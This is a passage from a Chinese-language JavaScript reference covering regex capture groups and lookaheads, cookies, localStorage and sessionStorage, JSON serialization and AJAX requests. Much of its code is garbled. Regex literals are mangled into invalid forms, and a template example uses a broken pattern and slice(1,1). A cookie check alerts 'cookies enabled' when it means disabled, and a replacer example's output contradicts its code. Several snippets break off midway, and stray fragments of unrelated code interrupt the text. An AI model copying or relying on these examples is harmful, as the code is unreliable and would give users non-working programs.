  预期输出\n3\n-1\n\n# 第 31.6 节：RegExp 组\n\nJavaScript 在正则表达式中支持多种类型的组：*捕获组*、*非捕获组*和*先行断言*。目前不支持*后行断言*（look-behind）。\n\
  \n## 捕获\n\n有时，所需的匹配依赖于其上下文。这意味着简单的 `RegExp` 会过度查找 `String` 中感兴趣的部分，因此解决方案是编写一个捕获组（模式）。捕获的数据随后可以通过以下方式引用为...\n\
  \n- 字符串替换 `$n`，其中 `n` 是第 `n` 个捕获组（从 1 开始）\n- 回调函数中的第 `n` 个参数\n\n如果 `RegExp` 没有标记\
  \ `g` 标志，则它是返回的 `str.match*` `Array` 数组第 `n+1` 个项。如果 `RegExp` 标记了 `g` 标志，`str.match`\
  \ 会丢弃捕获内容，请改用 `re.exec`\n\n假设有一个 `String`，所有的 `+` 符号都需要替换为空格，但仅当它们紧跟在字母字符之后。这意味着简单的匹配将包含该字母字符并且它也会被移除。捕获它是解决方案，因为这意味着匹配到的字母可以被保留。\n\
  \n```javascript\nlet str = \"aa+b+cc+1+2\", re = */([a-z])\\+/g*/\n\n// 字符串替换\n\
  str.replace(re, '$1 '); // \"aa b cc 1+2\"\n\n// 函数替换\nstr.replace(re, (m, $1) =>\
  \ $1 + ' '); // \"aa b cc 1+2\"\n```\n\n## 非捕获\n\n使用 `(?:pattern)` 形式，它们的工作方式与捕获组类似，不同之处它们在匹配后不会存储组的内容。\n\
  \n如果你捕获了其他数据且不想移动它们的索引，但需要进行某些高级模式匹配（例如 OR 逻辑），它们会特别有用。\n\n```javascript\nlet str\
  \ = \"aa+b+cc+1+2\", re = */(?:\\b|c)([a-z])\\+/g*/\n\nstr.replace(re, '$1 '); //\
  \ \"aa b c 1+2\"\n```\n\n## 先行断言\n\n如果所需的匹配依赖于其后面的内容，而不是匹配并捕获它，则可以使用先行断言对其进行测试，但不将其包含在匹配中。正先行断言的形式为\
  \ `(?=pattern)`，负先行断言（仅当先行断言模式未匹配时才发生表达式匹配）的形式为 `(?!pattern)`\n\n```javascript\n\
  let str = \"aa+b+cc+1+2\", re = */\\+(?=[a-z])/g*/ str.replace(re, ' '); // \"aa\
  \ b cc+1+2\"\n```\n\n# 第 31.7 节：使用回调函数替换字符串匹配\n\n`String#replace` 可以接受函数作为其第二个参数，这样你就可以根据某些逻辑提供替换。\n\
  \n```javascript\n\"Some string Some\".replace(*/Some/g*/ (match, startIndex, wholeString)\
  \ => { \n  if(startIndex == 0){\n    return 'Start';\n  } else {\n    return 'End';\n\
  \  }\n});\n// 将返回 Start string End\n```\n\n单行模板库\n\n```javascript\nlet data = {name:\
  \ 'John', surname: 'Doe'}\n\"My name is {surname}, {name} {surname}\".replace(*/?:{(.+?})/g*/\
  \ x => data[x.slice(1,1)]); // \"My name is Doe, John Doe\"\n```\n\n# 第 31.8 节：使用带括号的正则.exec()\
  \ 提取字符串的匹配项\n\n有时你不想简单地替换或删除字符串。有时你想提取并处理匹配项。这里有一个关于如何操作匹配项的示例。\n\n什么是匹配项？当在字符串中找到整个正则表达式的兼容子字符串时，`exec`\
  \ 命令产生一个匹配项。匹配项是一个数组，首先是匹配的整个子字符串，以及匹配中所有的括号。\n\n想象一个 html 字符串：\n\n```html\n<html>\n\
  <head></head>\n<body>\n<h1>Example</h1>\n<p> Look at this great link : <a href=\"\
  http://goalkicker.com\">goalkicker</a> http://anotherlinkoutsideatag</p>\nCopyright\
  \ <a href=\"https://stackoverflow.com\">Stackoverflow</a>\n</body>\n</html>\n```\n\
  \n你想提取并获取 `a` 标签内部所有的链接。首先，这里是你编写的正则表达式：\n\n```javascript\nvar re = */<a[^>]*href=\"\
  https?:\\/\\/.*\"[^>]*>[^<]*<\\/a>/g*/\n```\n\n但现在，想象你需要每个链接的 `href` 和锚点（anchor）。并且你想要它们在一起。你可以简单地为每个匹配添加一个新的正则\
  \ `OR`，或者你可以使用括号：\n\n```javascript\nvar re = */<a[^>]*href=\"(https?:\\/\\/.*)\"\
  [^>]*>([^<]*)<\\/a>/g*/\n\nvar str = '<<html>\\n <head></head>\\n <body>\\n <h1>Example</h1>\\\
  n <p>Look at this great link: <a href=\"http://goalkicker.com\">goalkicker</a> http://anotherlinkoutsideatag</p>\\\
  n\\nCopyright <a href=\"https://stackoverflow.com\">Stackoverflow</a> \\n </body>></html>';\n\
  var m;\nvar links = [];\n\nwhile ((m = re.exec(str)) !== null) { \n  if (m.index\
  \ === re.lastIndex) { \n    re.lastIndex++;\n  }\n  console.log(m[0]); // 整个字符串\n\
  \  console.log(m[1]); // href 部分\n  console.log(m[2]); // 锚点部分\n  links.push({\n\
  \    match : m[0], // 整个匹配\n    href : m[1], // 第一个括号 => (https?:\\/\\/.*)*\n  \
  \  anchor : m[2], // 第二个 => ([^<]*)*\n  });\n}\n```\n\n在循环结束时，你有一个包含锚点和 href 的链接数组，你可以用它来写\
  \ markdown，例如：\n\n```javascript\nlinks.forEach(function(link) {\n  console.log('%s',\
  \ link.anchor, link.href);\n});\n```\n\n进一步学习：嵌套括号\n\n# 第 32 章：Cookies\n\n## 第 32.1\
  \ 节：测试 cookies 是否启用\n\n如果你想在使用 cookies 之前确保它们已启用，可以使用 `navigator.cookieEnabled`：\n\
  \n```javascript\nif (navigator.cookieEnabled === false) {\n  alert(\"Error: cookies\
  \ enabled!\");\n}\n```\n注意，在旧版浏览器中 `navigator.cookieEnabled` 可能不存在且为 `undefined`。在这些情况下无法检测\
  \ cookies 是否启用。\n\n## 第 32.2 节：添加和设置 Cookies\n\n以下变量设置示例：\n\n```javascript\nvar\
  \ COOKIE_NAME = \"Example Cookie\";\nvar COOKIE_VALUE = \"Hello, world!\";\nvar\
  \ COOKIE_PATH = \"/foo/bar\";\nvar COOKIE_EXPIRES; /* cookie 的名称。 */\n/* cookie\
  \ 的值。 */\n/* cookie 的路径。 */\n/* cookie 的过期日期（在文配置）。 */\n/* 设置 cookie 过期时间为未来 1 分钟（60000ms\
  \ = 1 分钟）。 */\nCOOKIE_EXPIRES = (new Date(Date.now() + 60000)).toUTCString();\n\n\
  document.cookie += COOKIE_NAME + \"=\" + COOKIE_VALUE + \"; expires=\" + COOKIE_EXPIRES\
  \ + \"; path=\" + COOKIE_PATH;\n```\n\n## 第 32.3 节：读取 cookies\n\n```javascript\n\
  var name = name + \"=\",\ncookie_array = document.cookie.split(';'),\ncookie_value;\n\
  \nfor (var i=0;i<cookie_array.length;i++) {\n  var cookie=cookie_array[i];\n  while(cookie.charAt(0)=='\
  \ ')\n    cookie = cookie.substring(1,cookie.length);\n  if(cookie.indexOf(name)==0)\n\
  \    cookie_value = cookie.substring(name.length,cookie.length);\n}\n```\n这将 `cookie_value`\
  \ 设置为 cookie 的值，如果存在。如果未设置 cookie，它将 `cookie_value` 设置为 `null`。\n\n## 第 32.4 节：移除\
  \ cookies\n\n```javascript\nvar expiry = new Date();\nexpiry.setTime(expiry.getTime()\
  \ - 3600);\ndocument.cookie = name + \"=; expires=\" + expiry.toGMTString() + \"\
  ; path=/\";\n```\n这将移除指定的 cookie。\n\n# 第 33.1 节：使用 localStorage\n\n\n\n\n\n`localStorage`\
  \ 对象提供了持久的（但不是永久的 - 请见下文限制）字符串键值存储。任何更改都会立即在相同源的所有其他窗口/帧中可见。除非用户清除保存的数据或配置了过期限制，否则存储的值将无限期持续。`localStorage`\
  \ 使用了类似 map 的接口来获取和设置值。\n\n```javascript\nlocalStorage.setItem('name', \"John Smith\"\
  );\n\nconsole.log(localStorage.getItem('name')); // \"John Smith\"\n\nlocalStorage.removeItem('name');\n\
  \nconsole.log(localStorage.getItem('name')); // null\n```\n\n如果你想存储简单的结构化数据，可以使用\
  \ `JSON` 将其序列化为字符串以便进行存储。\n\n```javascript\nvar players = [{name: \"Tyler\", score:\
  \ 22}, {name: \"Ryan\", score: 41}]; localStorage.setItem('players', JSON.stringify(players));\n\
  \nconsole.log(JSON.parse(localStorage.getItem('players')));\n\n// [ Object { name:\
  \ \"Tyler\", score: 22 }, Object { name: \"Ryan\", score: 41 } ]\n```\n\n## 浏览器中的\
  \ localStorage 限制\n\n### 移动端浏览器：\n| 浏览器 | Google Chrome | Android 浏览器 | Firefox\
  \ | iOS Safari |\n| :--- | :--- | :--- | :--- | :--- |\n| 版本 | 40 | 4.3 | 34 | 6-8\
  \ Space |\n| 可用空间 | 10MB | 2MB | 10MB | 5MB | - |\n\n### 桌面浏览器：\n| 浏览器 | Google\
  \ Chrome | Opera | Firefox | Safari | Internet Explorer |\n| :--- | :--- | :---\
  \ | :--- | :--- | :--- |\n| 版本 | 40 | 27 | 34 | 6-8 | 9-11 |\n| 可用空间 | 10MB | 10MB\
  \ | 10MB | 5MB | 10MB |\n\n## 第 33.2 ：处理存储的简单方法\n\n`localStorage` 和 `sessionStorage`\
  \ 是 JavaScript `Objects`，你可以像对待对象一样对待它们。与其使用 `.getItem()`、`.setItem()` 等存储方法，这里有一个更简单的替代方案：\n\
  \n```javascript\n// 设置\nlocalStorage.greet = \"Hi!\"; // 等于：window.localStorage.setItem(\"\
  greet\", \"Hi!\");\n\n// 获取\nlocalStorage.greet; // 等于：window.localStorage.getItem(\"\
  greet\");\n\n// 删除项目\ndelete localStorage.greet; // 等于：window.localStorage.removeItem(\"\
  greet\"); // 清除存储\nlocalStorage.clear();\n```\n\n**示例：**\n\n```javascript\n// 存储值（字符串、数字）\n\
  localStorage.hello = \"Hello\"; localStorage.year = 2017;\n\n// 存储复杂数据（对象、数组）\n\
  var user = {name:\"John\", surname:\"Doe\", books:[\"A\",\"B\"]}; localStorage.user\
  \ = JSON.stringify( user );\n\n// 注意：数字作为字符串存储\nconsole.log( typeof localStorage.year\
  \ ); // String\n\n// 获取值\nvar someYear = localStorage.year; // \"2017\"\n\n// 获取复杂数据\n\
  var userData = JSON.parse( localStorage.user ); var userName = userData.name; //\
  \ \"John\"\n\n// 删除特定数据\ndelete localStorage.year;\n\n// 清除（删除）所有存储数据\nlocalStorage.clear();\n\
  ```\n\n## 第 33.3 节：存储事件\n\n每当 `localStorage` 中的值被设置时，都会在相同源的所有其他窗口中触发存储事件（storage\
  \ event）。这可以用于在不刷新或与服务器通信的情况下同步不同页面之间的状态。例如，我们可以将输入元素的值反映为另一个窗口中的段落文字：\n\n###第一个窗口\n\
  ```javascript\nvar input = document.createElement('input');\n\ndocument.body.appendChild(input);\n\
  \ninput.value = localStorage.getItem('user-value');\n\ninput.oninput = function(event)\
  \ {\n  localStorage.setItem('user-value', input.value);\n};\n```\n\n### 第二个窗口\n\
  ```javascript\nvar output = document.createElement('p');\n\ndocument.body.appendChild(output);\n\
  \noutput.textContent = localStorage.getItem('user-value');\n\nwindow.addEventListener('storage',\
  \ function(event) {\n  if (event.key === 'user-value') {\n    output.textContent\
  \ = event.newValue;\n  }\n});\n```\n\n### 注意\n如果通过脚本修改了域名，在 Chrome、Edge 和 Safari\
  \ 下不会触发或无法捕获事件。\n\n**第一个窗口**\n```javascript\n// 页面 URL: http://sub.a.com/1.html\n\
  document.domain = 'a.com';\n\nvar input = document.createElement('input'); document.body.appendChild(input);\n\
  \ninput.value = localStorage.getItem('user-value');\n\ninput.oninput = function(event)\
  \ {\n  localStorage.setItem('user-value', input.value);\n};\n```\n\n**第二个窗口**\n\
  ```javascript\n// 页面 URL: http://sub.a.com/2.html\ndocument.domain = 'a.com';\n\n\
  var output = document.createElement('p'); document.body.appendChild(output);\n\n\
  // 监听器在 Chrome(53)、Edge 和 Safari(10.0) 下永远不会被调用。\nwindow.addEventListener('storage',\
  \ function(event) {\n  if (event.key === 'user-value') {\n    output.textContent\
  \ = event.newValue;\n  }\n});\n```\n\n## 第 33.4 节：session\n\n`sessionStorage` 对象实现了与\
  \ `localStorage` 相同的存储接口。然而，它不是与相同源的所有页面共享，`sessionStorage` 数据是为每个窗口/标签页单独存储的。存储的数据在该窗口/标签页中只要打开就会一直存在。\n\
  \n\n\n\n\n```javascript\n+ \"\\r\\nISO ID: \" + item.getAttribute(\"data-id\") +\
  \ \"\\r\\nDial Code: \" + item.getAttribute(\"data-dial-code\"); alert(msg);\n\n\
  }\n\nfunction correctDetails(item) {\n  var item = document.getEmementById(\"C3\"\
  ); item.setAttribute(\"id\", \"FR\");\n  item.setAttribute(\"data-dial-code\", \"\
  33\");\n}\n```\n\n`</script>`\n\n# 第 35 章：JSON\n\n## 参数\n\n### `JSON.parse`\n- `input(string)`\n\
  - `reviver(function)`\n\n### `JSON.stringify`\n- `value(string)`\n- `replacer(function\
  \ or String[] or Number[])`\n- `space(String or Number)`\n\n## 详情\n\n### 解析 JSON\
  \ 字符串\n要解析的 `JSON` 字符串。规定了输入 `JSON` 字符串的转换。\n\n### 序列化可序列化值\n根据 `JSON` 规范序列化的值。选择性地包含值对象的某些属性。\n\
  \n如果提供了一个数字，则将插入 `space` 数量的空格以提高可读性。如果提供了一个字符串，将使用该字符串（前 10 个字符）作为空格。\n\n`JSON`（JavaScript\
  \ 对象表示法）是一种轻量的数据交换格式。它易于人类读写，也易于机器解析和生成。需要注意的是，在 JavaScript 中，`JSON` 是一个字符串而不是对象。\n\
  \n可以在 `json.org` 网站上找到基本概述，该网站还包含指向许多不同编程语言中标准实现的链接。\n\n## 第 35.1 节：JSON 对比 JavaScript\
  \ 字面量\n\n`JSON` 代表 \"JavaScript Object Notation\"，但它不是 JavaScript。将其看作一种数据序列化格式即可，它恰好可以直接作为\
  \ JavaScript 字面量使用。然而，不建议直接运行（例如通过 `eval()`）从外部源获取的 `JSON`。在功能上，`JSON` 与 `XML` 或\
  \ `YAML` 没有太大区别——如果将 `JSON` 想象成某种看起来非常像 JavaScript 的序列化格式，就可以避免一些混淆。\n\n尽管名称暗示了只有对象，尽管通过某些\
  \ API 的大多数用例恰好都是对象和数组，但 `JSON` 并不局限于对象或数组。支持以下原始类型：\n\n- 字符串（例如 \"Hello World!\"\
  ）\n- 数字（例如 42）\n- 布尔值（例如 `true`）\n- 值 `null`\n\n`undefined` 不支持，这意味着未定义的属性在序列化时将从\
  \ `JSON` 中省略。因此，没有办法反序列化 `JSON` 并得到一个值为 `undefined` 的属性。\n\n字符串 \"42\" 是有效的 `JSON`。`JSON`\
  \ 并不总是需要 `{...}` 或 `[...]` 作为外壳。\n\n虽然某些 `JSON` 也是有效的 JavaScript，某些 JavaScript 也是有效的\
  \ `JSON`，但两种语言之间存在一些细微差异，且一种语言都不是对方的子集。\n\n以以下 `JSON` 字符串为例：\n`{\"color\": \"blue\"\
  }`\n\n它可以直接插入 JavaScript。它在语法上是有效的，并将产生正确的值：\n\n```javascript\nconst skin = {\"\
  color\": \"blue\"};\n```\n\n然而，我们知道 \"color\" 是一个有效的标识符，属性名周围的引号可以省略：\n\n```javascript\n\
  const skin = {color: \"blue\"};\n```\n\n我们还知道可以使用单引号代替双引号：\n\n```javascript\nconst\
  \ skin = {'color': 'blue'};\n```\n\n但是，如果我们将这两个字面量并将它们视为 `JSON`，那么它们在语法上都不是有效的 `JSON`：\n\
  \n```json\n{color: \"blue\"} {'color': 'blue'}\n```\n\n`JSON` 严格要求所有属性名必须使用双引号，字符串值也必须使用双引号。\n\
  \n`JSON` 新手经常尝试使用带有 JavaScript 字面量的代码片段作为 `JSON`，并对 `JSON` 解析器返回的语法错误感到困惑。\n\n当在代码或对话中使用不正确的术语时，更多的混淆便开始出现。\n\
  \n一种常见的反模式是将持有非 JSON 值的变量命名为 \"json\"：\n\n```javascript\nfetch(url).then(function\
  \ (response) {\n  const json = JSON.parse(response.data); // 混淆随之而来！\n  // 到这里我们已经结束了对“JSON”的概念，//\
  \ 但这个概念留在了变量名中。\n});\n```\n\n在上面的示例中，`response.data` 是某些 API 返回的 `JSON` 字符串。`JSON`\
  \ 止于 HTTP 响应领域。带有 \"json\" 误名的变量所有的仅仅是一个 JavaScript 值（可以是对象、数组，甚至是一个简单的数字！）\n\n\
  上述不那么混淆的写法是：\n\n```javascript\nfetch(url).then(function (response) {\n  const value\
  \ = JSON.parse(response.data);\n  // 到这里我们已经结束了对“JSON”的概念。// 解析 JSON 之后你就不再谈论 JSON\
  \ 了。\n});\n```\n\n开发者也经常使用“JSON 对象”这个短语。这也导致了混淆。正如上面提到的，`JSON` 字符串并不一定持有对象作为值。“JSON\
  \ 字符串”是一个更好的术语。就像“XML 字符串”或“YAML 字符串”一样。你得到一个字符串，解析它，最后得到一个值。\n\n## 第 35.2 节：使用\
  \ reviver 函数解析 JSON\n\n`reviver` 函数用于过滤或转换被解析的值。\n\n版本 ≥ 5.1\n```javascript\nvar\
  \ jsonString = '[{\"name\":\"John\",\"score\":51}]';\nvar data = JSON.parse(jsonString,\
  \ function (key, value) {\n```\n\n版本 ≥ 6\n```javascript\nconst jsonString = '[{\"\
  name\":\"John\",\"score\":51}]';\nconst data = JSON.parse(jsonString, (key, value)\
  \ =>\n```\n\n确保 `reviver` 函数在每次迭代结束时返回一个有用的值。如果 `reviver` 函数返回 `undefined`，则该属性被删除。否则，该属性将被重新定义为。\n\
  \n## 第 35.3 节：序列化值\n\nJavaScript 值可以使用 `JSON.stringify` 函数转换为 `JSON` 字符串。\n\n`JSON.stringify(value[,\
  \ replacer[, space]])`\n\n1. value：要转换为 字符串的值。\n- 布尔值：`JSON.stringify(true)` ->\
  \ `'true'`\n- 数字：`JSON.stringify(12)` -> `'12'`\n- 字符串：`JSON.stringify('foo')` ->\
  \ `'foo'`\n- 对象：`JSON.stringify({})` -> `'{}'`\n- 数组：`JSON.stringify([1, true, 'foo'])`\
  \ -> `'[1, true, \"foo\"]'`\n- 日期：`JSON.stringify(new Date())` -> `'\"2016-08-06T17:25:23.588Z\"\
  '`\n- 符号：`JSON.stringify({x:Symbol()})` -> `'{}'`\n\n2. replacer：改变字符串化过程的函数，或一组字符串和数字对象，作为白名单用于过滤要包含在\
  \ JSON 字符串中的对象属性。如果此值为 `null` 或未提供，则对象的所有属性将包含在生成的 JSON 字符串中。\n\n作为函数的 replacer：\n\
  ```javascript\nfunction replacer (key, value) {\n  // 过滤属性\n  if (typeof value ===\
  \ \"string\") {}\n  return value;\n}\n\nvar foo = { foundation: \"Mozilla\", model:\
  \ \"box\", week: 45, transport: \"car\", month: 7 };\nJSON.stringify(foo, replacer);\
  \ \n// -> '{\"week\": 45, \"month\": 7}'\n```\n\n作为数组的 replacer：\n```javascript\n\
  JSON.stringify(foo, ['foundation', 'week', 'month'])\n```\n\n\n\n\n\n```javascript\n\
  // -> '{\"foundation\": \"Mozilla\", \"week\": 45, \"month\": 7}'\n// 只保留了 `foundation`、`week`\
  \ 和 `month` 属性\n```\n\n3.  为了可读性，用于缩进的空格数可以作为第三参数指定。\n\n`JSON.stringify({x: 1, y:\
  \ 1}, null, 2)` // 将使用 2 个空格作为缩进 /* 输出:*\n```json\n {\n  'x': 1, 'y': 1 \n}\n```\n\
  \n或者，可以提供一个字符串值用于缩进。例如，传递 `\\t` 将导致使用制表符进行缩进。\n\n`JSON.stringify({x: 1, y: 1}, null,\
  \ '\\t')` // 输出:*\n```json\n {\n  'x': 1, 'y': 1 \n}\n```\n\n### 第 35.4 ：类实例序列化与恢复\n\
  \n你可以使用自定义的 `toJSON` 方法和 `reviver` 函数在 JSON 中传输你自定义类的实例。如果一个对象具有 `toJSON` 方法，则将序列化产生的结果而不是对象本身。\n\
  \n版本 < 6\n\n```javascript\nfunction Car(color, speed) {\n  this.color = color;\n\
  \  this.speed = speed;\n}\n\nCar.prototype.toJSON = function() {\n  return {\n \
  \   $type: 'com.example.Car',\n    color: this.color,\n    speed: this.speed\n \
  \ };\n};\n\nCar.fromJSON = function(data) {\n  return new Car(data.color, data.speed);\n\
  };\n```\n\n版本 ≥ 6\n\n```javascript\nclass Car {\n  constructor(color, speed) {\n\
  \    this.color = color;\n    this.speed = speed;\n    this.id_ = Math.random();\n\
  \  }\n  toJSON () {\n    return {\n      $type: 'com.example.Car', color: this.color,\n\
  \      speed: this.speed\n    };\n  }\n  static fromJSON(data) {\n    return new\
  \ Car(data.color, data.speed);\n  }\n}\n```\n\n`var userJson = JSON.stringify({\
  \ name: \"John\", car: new Car('red', 'fast') });`\n\n这产生了一个包含以下内容的字符串：\n`{\"name\"\
  :\"John\",\"car\":{\"$type\":\"com.example.Car\",\"color\":\"red\",\"speed\":\"\
  fast\"}}`\n\n`var userObject = JSON.parse(userJson, function reviver(key, value)\
  \ { return (value && value.$type === 'com.example.Car') ? Car.fromJSON(value) :\
  \ value; });`\n\n这产生了以下对象：\n```json\n{ name: \"John\",\n  car: Car {\n    color\
  \ : \"red\",\n    speed: \"fast\",\n    id_: 0.19349242527065402\n  }\n}\n```\n\n\
  ### 第 35.5 ：使用 replacer 函数进行序列化\n\n替换函数（replacer function）可以用于过滤或转换被序列化的值。\n\n```javascript\n\
  const userRecords = [\n  {name: \"Joe\", points: 14.9, level: 31.5},\n  {name: \"\
  Jane\", points: 35.5, level: 74.4},\n  {name: \"Jacob\", points: 18.5, level: 41.2},\n\
  \  {name: \"Jessie\", points: 15.1, level: 28.1},\n];\n```\n\n// 在共享前移除名称并将数字取整，以匿名化记录\n\
  const anonymousReport = JSON.stringify(userRecords, (key, value) => key === 'name'\n\
  \  ? undefined\n  : (typeof value === 'number' ? Math.floor(value) : value)\n);\n\
  \n这产生了以下字符串：\n`'[{\"points\":14,\"level\":31},{\"points\":35,\"level\":74},{\"points\"\
  :18,\"level\":41},{\"points\":15,\"level\":28}]'`\n\n### 第 35.6 ：解析简单的 JSON 字符串\n\
  \n`JSON.parse()` 方法将字符串解析为 JSON 并返回 JavaScript 原始类型、数组或对象：\n\n```javascript\nconst\
  \ array = JSON.parse('[1, 2, \"c\", \"d\", {\"e\": false}]');\nconsole.log(array);\
  \ // 记录: [1, 2, \"c\", \"d\", {e: false}]\n```\n\n### 第 35.7 ：循环对象值\n\n并不是所有对象都可以转换为\
  \ JSON 字符串。当对象具有循环自引用时，转换将失败。\n\n这种情况通常发生在分级数据结构中，其中父节点和子节点相互引用：\n\n```javascript\n\
  const world = {\n  name: 'World',\n  regions: []\n};\nworld.regions.push({\n  name:\
  \ 'North America',\n  parent: 'America'\n});\nconsole.log(JSON.stringify(world));\
  \ // {\"name\":\"World\",\"regions\":[{\"name\":\"North America\",\"parent\":\"\
  America\"}]}\n```\n\nworld.regions.push({\n  name: 'Asia',\n  parent: world\n});\n\
  console.log(JSON.stringify(world)); // 未捕获 TypeError: Converting circular structure\
  \ to JSON\n```\n\n一旦进程检测到循环，就会抛出异常。如果没有循环检测，字符串将是无限长的。\n\n### 第 36 章：AJAX\n\nAJAX\
  \ 代表“Asynchronous JavaScript and XML”（异步 JavaScript 和 XML）。虽然名称中包含 XML，但由于其格式更简单且冗余较低，JSON\
  \ 被更频繁地使用。AJAX 允许用户在不刷新网页的情况下与外部资源通信。\n\n### 第 36.1 ：通过 POST 发送和接收 JSON 数据\n\n版本\
  \ ≥ 6\n\nFetch 请求最初返回 `Response` 对象。这些对象将提供响应头信息，但它们没有直接包含响应体，响应体甚至可能还没有加载。`Response`\
  \ 对象上的方法（如 `.json()`）可以等待响应体加载，然后对其进行解析。\n\n```javascript\nconst requestData = {\n\
  \  method : 'getUsers'\n};\nconst usersPromise = fetch('/api', {\n  method : 'POST',\n\
  \  body : JSON.stringify(requestData)\n}).then(response => {\n  if (!response.ok)\
  \ {\n    throw new Error(\"从 API 服务器收到非 2XX 响应.\");\n  }\n  return response.json();\n\
  }).then(responseData => {\n  return responseData.users;\n});\nusersPromise.then(users\
  \ => {\n  console.log(\"Known users: \", users);\n}, error => {\n  console.error(\"\
  由于错误获取用户失败: \", error);\n});\n```\n\n### 第 36.2 ：添加 AJAX 预加载器\n\n这里有一种在 AJAX 调用执行时显示\
  \ GIF 预加载器的方法。我们需要准备好添加和移除预加载器的函数：\n\n```javascript\nfunction addPreloader() {\n\
  \  // 如果预加载器不存在，则向页面中添加一个\n  if(!document.querySelector('#preloader')) {\n    var\
  \ preloaderHTML = '<img id=\"preloader\" src=\"https://goo.gl/cNhyvX\" /> document.querySelector('body').innerHTML\
  \ += preloaderHTML;\n  }\n}\n\nfunction removePreloader() {\n  // 选择预加载器元素\n  var\
  \ preloader = document.querySelector('#preloader'); // 如果存在，则将其从页面中移除\n  if(preloader)\
  \ {\n    preloader.remove();\n  }\n}\n```\n\n现在我们来看看在何使用这些函数。\n\n`var request =\
  \ new XMLHttpRequest();`\n\n在 `onreadystatechange` 函数内部，你应该有一个带有条件的 `if` 语句：`request.readyState\
  \ == 4 && request.status == 200`。\n\n如果为 `true`：请求完成且响应已就绪，这就是我们使用 `removePreloader()`\
  \ 的地方。\n否则如果为 `false`：请求仍在进行，在这种情况下我们运行函数 `addPreloader()`。\n\n```javascript\nxmlhttp.onreadystatechange\
  \ = function() {\n  if (request.readyState == 4 && request.status == 200) { // 请求结束，移除预加载器\n\
  \    removePreloader();\n  } else {\n    // 请求未完成，添加预加载器\n    addPreloader()\n \
  \ }\n};\nxmlhttp.open('GET', your_file.php, true); xmlhttp.send();\n```\n\n### 第\
  \ 36.3 ：从 Stack Overflow 显示热门 JavaScript 问题\n\n我们可以向 Stack Exchange API 发起 AJAX\
  \ 请求以获取热门 JavaScript 问题列表，然后将它们作为链接列表展示。如果请求失败或返回 API 错误，我们的 Promise 错误处理将显示错误。\n\
  \n版本 ≥ 6\n\n在 HyperWeb 上查看结果。\n\n```javascript\nconst url = 'http://api.stackexchange.com/2.2/questions?site=stackoverflow'\
  \ +\ntagged=javascript&sort=month&filter=unsafe&key=gik4BOCMC7J9doavgYteRw';\nfetch(url).then(response\
  \ => response.json()).then(data => {\n  if (data.error_message) {\n    throw new\
  \ Error(data.error_message);\n  }\n  const list = document.createElement('ol');\
  \ document.body.appendChild(list);\n  for (const {title, link} of data.items) {\n\
  \    const entry = document.createElement('li');\n    const hyperlink = document.createElement('a');\n\
  \    entry.appendChild(hyperlink);\n    list.appendChild(entry);\n    hyperlink.textContent\
  \ = title;\n    hyperlink.href = link;\n  }\n}).then(null, error => {\n  const message\
  \ = document.createElement('pre'); document.body.appendChild(message); message.style.color\
  \ = 'red';\n  message.textContent = String(error);\n});\n```\n\n### 第 36.4 ：带参数使用\
  \ GET\n\n\n\n\n\n此函数使用 `GET` 发起 AJAX 调用，允许我们向 `file`（字符串）发送 `parameters`（对象），并在请求结束后触发\
  \ `callback`（函数）。\n\n```javascript\nfunction ajax(file, params, callback) {\n  var\
  \ url = file + '?';\n\n  // 遍历对象并组装 url\n  var notFirst = false;\n  for (var key\
  \ in params) {\n    if (params.hasOwnProperty(key)) {\n      url += (notFirst ?\
  \ '&' : '') + key + \"=\" + params[key];\n    }\n    notFirst = true;\n  }\n\n \
  \ // 使用 url 作为参数创建 AJAX 调用\n  var xmlhttp = new XMLHttpRequest();\n  xmlhttp.onreadystatechange\
  \ = function() {\n    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {\n\
  \      callback(xmlhttp.responseText);\n    }\n  };\n  xmlhttp.open('GET', url,\
  \ true);\n  xmlhttp.send();\n}\n```\n\n以下是我们的如何使用方法：\n\n```javascript\najax ('cars.php',\
  \ {type:\"Volvo\", model:\"300\", color:\"purple\"}, function(response) {\n  //\
  \ 在此处添加数据返回到此页面时执行的代码\n  // 例如 console.log(response) 将在控制台中显示 AJAX 响应\n});\n```\n\
  \n下文显示了如何在 cars.php 中获取 url 参数：\n\n```php\nif (isset($_REQUEST['type'], $_REQUEST['model'],\
  \ $_REQUEST['color'])) {\n  // 它们被设置了，我们可以使用它们！\n  $response = 'The color of your\
  \ car is ' . $_REQUEST['color'] . '. ';\n  $response .= 'It is a ' . $_REQUEST['type']\
  \ . ' model ' . $_REQUEST['model'] . '!';\n  echo $response;\n}\n```\n\n如果你在 `callback`\
  \ 函数中使用了 `console.log(response)`，控制台中的结果将是：The color of your car is purple. It is\
  \ a Volvo model 300!\n\n### 章节 36.5：通过 HEAD 请求检查文件是否存在\n\n此函数使用 `HEAD` 方法执行 AJAX\
  \ 请求，允许我们检查作为参数提供的目录中是否存在文件。它还允许我们为每种情况（成功、失败）触发回调函数。\n\n```javascript\nfunction\
  \ fileExists(dir, successCallback, errorCallback) {\n  var xhttp = new XMLHttpRequest;\n\
  \n  /* 检查请求的状态 */\n  xhttp.onreadystatechange = function() {\n    return (xhttp.status\
  \ !== 404) ? successCallback : errorCallback;\n  };\n\n  /* 打开并发送请求 */\n  xhttp.open('head',\
  \ dir, false);\n  xhttp.send();\n};\n```\n\n### 章节 36.6：使用 GET 不带参数\n\n```javascript\n\
  var xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function () {\n  if\
  \ (xhttp.readyState === XMLHttpRequest.DONE && xhttp.status === 200) {\n    // 解析\
  \ xhttp.responseText 中的响应\n  }\n};\nxhttp.open(\"GET\", \"ajax_info.txt\", true);\n\
  xhttp.send();\n```\n\n#### 版本 ≥ 6\n\n`fetch` API 是一种较新的基于 promise 的发起异步 HTTP 请求的方法。\n\
  \n```javascript\nfetch ('/').then(response => response.text()).then(text => {\n\
  \  console.log(\"The home page is \" + text.length + \" characters long.\");\n});\n\
  ```\n\n### 章节 36.7：在全局范围内监听 AJAX 事件\n\n```javascript\n// 存储原生方法的引用\nlet open = XMLHttpRequest.prototype.open;\n\
  \n// 重写原生方法\nXMLHttpRequest.prototype.open = function() {\n  // 分配一个事件监听器\n  this.addEventListener(\"\
  load\", event => console.log(XHR), false);\n  // 调用存储的原生方法引用\n  open.apply(this,\
  \ arguments);\n};\n```\n\n### 章节 37：枚举 (Enumerations)\n\n#### 章节 37.1：使用 Object.freeze()\
  \ 定义枚举\n\n##### 版本 ≥ 5.1\n\nJavaScript 不直接支持枚举器，但可以模拟枚举的功能。\n\n```javascript\n//\
